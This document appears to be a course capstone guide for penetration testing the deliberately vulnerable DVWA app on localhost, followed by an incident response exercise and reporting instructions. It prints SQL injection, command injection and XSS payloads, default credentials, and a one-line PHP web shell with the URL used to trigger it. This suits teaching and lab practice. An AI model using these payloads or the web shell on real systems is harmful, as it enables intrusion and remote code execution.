1️⃣ Objective

Example:

To perform penetration testing on DVWA and simulate incident response for detected attacks.

2️⃣ Scope

Target: DVWA (localhost only)

Environment: Kali Linux

Attacks tested:

SQL Injection

XSS

Command Injection

File Upload

Brute Force

CSRF

3️⃣ Tools Used

Kali Linux

DVWA

Burp Suite

Firefox

Nmap (optional)

Nikto (optional)

4️⃣ Timeline

Mention:
Days 49–60 → Capstone + IR Simulation

✅ PHASE 3: Implementation (Pentesting Execution)

Now perform structured testing again properly and document.

🔎 Step 1: Reconnaissance

Even though it's localhost, simulate recon.

Open terminal:

ifconfig

Identify IP address.

(Optional)

nmap 127.0.0.1

Document:

Open ports

Service (Apache)

PHP version (if visible)

Take screenshot.

💉 Step 2: SQL Injection Testing

DVWA → SQL Injection
Security → Low

Test:

1' OR '1'='1

Observe:

All users returned

Now test:

Medium

High

Take screenshots of:

Low result

Medium result

High result

Document:

Vulnerability severity

Why it happens

💻 Step 3: Command Injection

DVWA → Command Injection

Test:

127.0.0.1; whoami

Result:
Should show www-data

Take screenshot.

Explain:

Unsanitized system() call

OS command execution

🌐 Step 4: XSS Testing
Stored XSS
<script>alert("XSS")</script>

If popup appears → vulnerable.

Reflected XSS
<script>alert(1)</script>

Take screenshots.

Explain impact:

Cookie stealing

Session hijacking

📂 Step 5: File Upload Exploitation

Create:

nano shell.php

Add:

<?php system($_GET['cmd']); ?>

Upload in DVWA.

Access:

http://localhost/dvwa/hackable/uploads/shell.php?cmd=whoami

If shows:

www-data

Take screenshot.

Explain:

RCE achieved

Critical severity

🔐 Step 6: Brute Force

DVWA → Brute Force
Security → Low

Try:

admin
password

Observe behavior.

Compare with:

High security (CAPTCHA)

Screenshot both.

🔁 Step 7: CSRF Testing

Change password at Low security.

Capture request in Burp.

Replay request.

Observe behavior.

Compare with High security (token protection).

Screenshot.

✅ PHASE 4: Incident Response Simulation

Now this is IMPORTANT — many students forget this.

You must simulate defender role.

🚨 Step 1: Detect the Attack

Go to:

/var/log/apache2/access.log

Open:

sudo nano /var/log/apache2/access.log

Look for:

SQL injection payload

shell.php access

suspicious parameters (?cmd=)

Take screenshot.

Explain:

Indicators of compromise (IOC)

🛑 Step 2: Containment

Write what you would do:

Disable file upload

Remove malicious shell.php

Stop Apache temporarily

Block attacker IP (iptables)

Example:

sudo rm shell.php
🧹 Step 3: Eradication

Patch DVWA

Enable input validation

Disable PHP execution in uploads

Apply prepared statements

🔄 Step 4: Recovery

Restart Apache

Reset compromised passwords

Review logs

Re-enable service

📝 Step 5: Post-Incident Report

Write:

What happened

How detected

Impact

Actions taken

Lessons learned

✅ PHASE 5: Final Documentation

Your PDF must contain:

1️⃣ Executive Summary
2️⃣ Scope & Objectives
3️⃣ Methodology
4️⃣ Tools Used
5️⃣ Vulnerability Findings (With Screenshots)
6️⃣ Risk Severity Table
7️⃣ Mitigation Strategies
8️⃣ Incident Response Simulation
9️⃣ Conclusion
✅ PHASE 6: GitHub Repository Structure

Structure like this:

DVWA-Capstone-Project/
│
├── README.md
├── Report.pdf
├── screenshots/
│   ├── sqli-low.png
│   ├── xss.png
│   ├── rce.png
│
├── payloads/
│   ├── shell.php
│
└── methodology.md
✅ PHASE 7: 12-Minute Video Structure

Follow this structure:

1 min – Introduction
2 min – Lab Setup
4 min – Vulnerability Demonstrations
3 min – Incident Response
1 min – Mitigation
1 min – Conclusion
